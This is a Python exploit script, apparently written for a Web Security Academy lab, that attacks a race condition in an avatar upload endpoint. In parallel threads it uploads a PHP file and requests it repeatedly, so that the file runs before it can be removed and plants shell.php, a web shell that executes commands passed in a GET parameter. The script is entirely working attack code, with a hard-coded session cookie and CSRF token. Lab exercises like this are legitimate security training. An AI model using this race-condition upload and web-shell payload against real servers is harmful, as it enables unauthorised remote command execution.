import requests, concurrent.futures, sys, signal

# Ctrl + C
def signal_handler(signal, frame):
    print("\n[!] Exiting ...")
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)

# CHANGE THE URLs and POST DATA to match yours

post_url = "https://0afb00ea038aa24c812dc55400b400de.web-security-academy.net/my-account/avatar"
get_url = "https://0afb00ea038aa24c812dc55400b400de.web-security-academy.net/files/avatars/create.php"

headers = {
    "Cookie": "session=oaPdnoGp0rzdL90LJLbSef9BPjujgQRE",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "https://0afb00ea038aa24c812dc55400b400de.web-security-academy.net/my-account?id=wiener",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "es-ES,es;q=0.9"
}

post_data = {
    "user": "wiener",
    "csrf": "kCYsEkHdJiP4byzrDWNUv1i1kYf5rUF4"
}

files = {
    "avatar": ("create.php", '''<?php
$fileContent = '<?php system($_GET["cmd"]); ?>';
$fileName = 'shell.php';

file_put_contents($fileName, $fileContent);

echo "shell.php is stored in the upload endpoint and uses the cmd GET parameter";
?>''', "application/x-php")
}

def send_post_request():
    response = requests.post(post_url, headers=headers, data=post_data, files=files)
    return response.status_code

def send_get_request():
    response = requests.get(get_url, headers=headers)
    if response.status_code == 200:
        print("GET Request Successful")
        print(response.text)
        return True
    return False

if __name__ == "__main__":
    while True:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            post_future = executor.submit(send_post_request)
            get_future = executor.submit(send_get_request)

            post_status_code = post_future.result()
            if get_future.result():
                break

        print("POST Request Sent. Response Code:", post_status_code)
